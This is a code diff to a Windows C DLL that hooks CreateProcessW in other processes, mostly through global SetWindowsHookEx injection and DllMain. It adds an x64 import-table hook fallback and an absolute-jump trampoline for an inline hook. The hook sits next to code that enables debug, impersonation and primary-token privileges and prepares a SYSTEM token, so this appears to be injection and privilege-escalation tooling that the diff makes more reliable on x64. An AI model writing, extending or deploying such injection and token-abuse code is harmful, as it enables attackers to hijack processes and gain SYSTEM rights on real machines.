@@ -248,9 +248,105 @@ static BOOL WINAPI HookCreateProcessW(
     return TRUE;
 }
 
+/* IAT hook: much safer on x64 because we never touch instruction bytes. */
+static BOOL InstallIATHook(void) {
+    HMODULE hMod = GetModuleHandle(NULL);
+    if (!hMod) return FALSE;
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
+
+    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)
+        ((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+    if (!importDesc) return FALSE;
+
+    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
+    if (!hKernel) return FALSE;
+    void* realAddr = GetProcAddress(hKernel, "CreateProcessW");
+    if (!realAddr) return FALSE;
+
+    for (; importDesc->Name; importDesc++) {
+        const char* dllName = (const char*)((BYTE*)hMod + importDesc->Name);
+        if (_stricmp(dllName, "kernel32.dll") != 0 && _stricmp(dllName, "KERNEL32.DLL") != 0) continue;
+
+        PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)hMod + importDesc->OriginalFirstThunk);
+        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hMod + importDesc->FirstThunk);
+        if (!thunk) continue;
+
+        if (origThunk) {
+            for (; origThunk->u1.AddressOfData; origThunk++, thunk++) {
+                if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) continue;
+                PIMAGE_IMPORT_BY_NAME import = (PIMAGE_IMPORT_BY_NAME)
+                    ((BYTE*)hMod + origThunk->u1.AddressOfData);
+                if (strcmp(import->Name, "CreateProcessW") != 0) continue;
+
+                DWORD oldProtect;
+                if (VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
+                                   PAGE_READWRITE, &oldProtect)) {
+                    pOrigCreateProcessW = (CreateProcessW_t)thunk->u1.Function;
+                    thunk->u1.Function = (ULONG_PTR)HookCreateProcessW;
+                    VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
+                                   oldProtect, &oldProtect);
+                    return TRUE;
+                }
+            }
+        } else {
+            /* OriginalFirstThunk is NULL; match by address */
+            for (; thunk->u1.Function; thunk++) {
+                if (thunk->u1.Function == (ULONG_PTR)realAddr) {
+                    DWORD oldProtect;
+                    if (VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
+                                       PAGE_READWRITE, &oldProtect)) {
+                        pOrigCreateProcessW = (CreateProcessW_t)thunk->u1.Function;
+                        thunk->u1.Function = (ULONG_PTR)HookCreateProcessW;
+                        VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
+                                       oldProtect, &oldProtect);
+                        return TRUE;
+                    }
+                }
+            }
+        }
+    }
+    return FALSE;
+}
+
+static void RemoveIATHook(void) {
+    if (!pOrigCreateProcessW) return;
+    HMODULE hMod = GetModuleHandle(NULL);
+    if (!hMod) return;
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
+    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)
+        ((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+    if (!importDesc) return;
+
+    for (; importDesc->Name; importDesc++) {
+        const char* dllName = (const char*)((BYTE*)hMod + importDesc->Name);
+        if (_stricmp(dllName, "kernel32.dll") != 0) continue;
+        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)hMod + importDesc->FirstThunk);
+        if (!thunk) continue;
+        for (; thunk->u1.Function; thunk++) {
+            if (thunk->u1.Function == (ULONG_PTR)HookCreateProcessW) {
+                DWORD oldProtect;
+                if (VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
+                                   PAGE_READWRITE, &oldProtect)) {
+                    thunk->u1.Function = (ULONG_PTR)pOrigCreateProcessW;
+                    VirtualProtect(&thunk->u1.Function, sizeof(thunk->u1.Function),
+                                   oldProtect, &oldProtect);
+                }
+                break;
+            }
+        }
+    }
+    pOrigCreateProcessW = NULL;
+}
+
 /* Inline hook: overwrite first 5 bytes of CreateProcessW with a JMP to our hook.
    A proper trampoline is required so calling pOrigCreateProcessW does not
-   re-enter the hook (which would cause infinite recursion / stack overflow). */
+   re-enter the hook (which would cause infinite recursion / stack overflow).
+   On x64 we use an absolute JMP in the trampoline so distance never matters. */
 static BOOL InstallInlineHook(void) {
     HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
     if (!hKernel) return FALSE;
@@ -260,31 +356,45 @@ static BOOL InstallInlineHook(void) {
     /* Save original bytes */
     memcpy(origBytes, pRealCreateProcessW, 5);
 
-    /* Allocate trampoline (16 bytes: 5 original + 5 JMP + padding) */
-    pTrampoline = VirtualAlloc(NULL, 16, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    /* Allocate trampoline (32 bytes: 5 original + 12 absolute JMP + padding) */
+    pTrampoline = VirtualAlloc(NULL, 32, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!pTrampoline) return FALSE;
 
     /* Copy original 5 bytes to trampoline */
     memcpy(pTrampoline, origBytes, 5);
 
-    /* Add JMP from trampoline+5 to original+5 */
+    /* Add absolute JMP from trampoline+5 to original+5 (movabs rax, addr; jmp rax) */
     BYTE* pTrampJmp = (BYTE*)pTrampoline + 5;
-    pTrampJmp[0] = 0xE9;
-    DWORD trampOffset = (DWORD)pRealCreateProcessW + 5 - ((DWORD)pTrampoline + 5) - 5;
-    memcpy(&pTrampJmp[1], &trampOffset, 4);
+    pTrampJmp[0] = 0x48;                          /* REX.W */
+    pTrampJmp[1] = 0xB8;                          /* mov rax, imm64 */
+    *(UINT64*)(pTrampJmp + 2) = (UINT64)((BYTE*)pRealCreateProcessW + 5);
+    pTrampJmp[10] = 0xFF;                         /* jmp rax */
+    pTrampJmp[11] = 0xE0;
 
     DWORD oldProtect;
-    if (!VirtualProtect(pRealCreateProcessW, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) return FALSE;
+    if (!VirtualProtect(pRealCreateProcessW, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        VirtualFree(pTrampoline, 0, MEM_RELEASE);
+        pTrampoline = NULL;
+        return FALSE;
+    }
 
     /* Write JMP rel32 to our hook */
     BYTE jmp[5];
     jmp[0] = 0xE9;
-    DWORD offset = (DWORD)HookCreateProcessW - (DWORD)pRealCreateProcessW - 5;
+    INT_PTR diff = (INT_PTR)((BYTE*)HookCreateProcessW - ((BYTE*)pRealCreateProcessW + 5));
+    if (diff < INT_MIN || diff > INT_MAX) {
+        VirtualProtect(pRealCreateProcessW, 5, oldProtect, &oldProtect);
+        VirtualFree(pTrampoline, 0, MEM_RELEASE);
+        pTrampoline = NULL;
+        return FALSE;
+    }
+    INT32 offset = (INT32)diff;
     memcpy(&jmp[1], &offset, 4);
     memcpy(pRealCreateProcessW, jmp, 5);
 
     VirtualProtect(pRealCreateProcessW, 5, oldProtect, &oldProtect);
     FlushInstructionCache(GetCurrentProcess(), pRealCreateProcessW, 5);
+    FlushInstructionCache(GetCurrentProcess(), pTrampoline, 32);
 
     /* pOrigCreateProcessW now points to the trampoline, not the hooked function */
     pOrigCreateProcessW = (CreateProcessW_t)pTrampoline;
@@ -310,22 +420,36 @@ static void RemoveInlineHook(void) {
 /* GetMsgProc for SetWindowsHookEx global injection */
 __declspec(dllexport) LRESULT CALLBACK GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && !hookInstalled) {
-        EnablePrivilege(L"SeDebugPrivilege");
-        EnablePrivilege(L"SeImpersonatePrivilege");
-        EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
-        if (!gSystemToken) PrepareSystemToken();
-        hookInstalled = InstallInlineHook();
+        wchar_t modName[MAX_PATH];
+        GetModuleFileNameW(NULL, modName, MAX_PATH);
+        wchar_t* baseName = wcsrchr(modName, L'\\');
+        if (baseName) baseName++; else baseName = modName;
+        if (!IsCriticalProcess(baseName)) {
+            EnablePrivilege(L"SeDebugPrivilege");
+            EnablePrivilege(L"SeImpersonatePrivilege");
+            EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
+            if (!gSystemToken) PrepareSystemToken();
+            hookInstalled = InstallInlineHook();
+            if (!hookInstalled) hookInstalled = InstallIATHook();
+        }
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 /* Exported install/uninstall for manual injection */
 __declspec(dllexport) void InstallHook(void) {
-    if (!hookInstalled) hookInstalled = InstallInlineHook();
+    if (!hookInstalled) {
+        hookInstalled = InstallInlineHook();
+        if (!hookInstalled) hookInstalled = InstallIATHook();
+    }
 }
 
 __declspec(dllexport) void UninstallHook(void) {
-    if (hookInstalled) { RemoveInlineHook(); hookInstalled = FALSE; }
+    if (hookInstalled) {
+        if (pRealCreateProcessW) RemoveInlineHook();
+        else RemoveIATHook();
+        hookInstalled = FALSE;
+    }
 }
 
 /* Explicit injection helper: injects this DLL into a target process */
@@ -389,10 +513,14 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
                 EnablePrivilege(L"SeAssignPrimaryTokenPrivilege");
                 if (!gSystemToken) PrepareSystemToken();
                 hookInstalled = InstallInlineHook();
+                if (!hookInstalled) hookInstalled = InstallIATHook();
             }
         }
     } else if (reason == DLL_PROCESS_DETACH) {
-        if (hookInstalled) RemoveInlineHook();
+        if (hookInstalled) {
+            if (pRealCreateProcessW) RemoveInlineHook();
+            else RemoveIATHook();
+        }
         if (gSystemToken) CloseHandle(gSystemToken);
     }
     return TRUE;
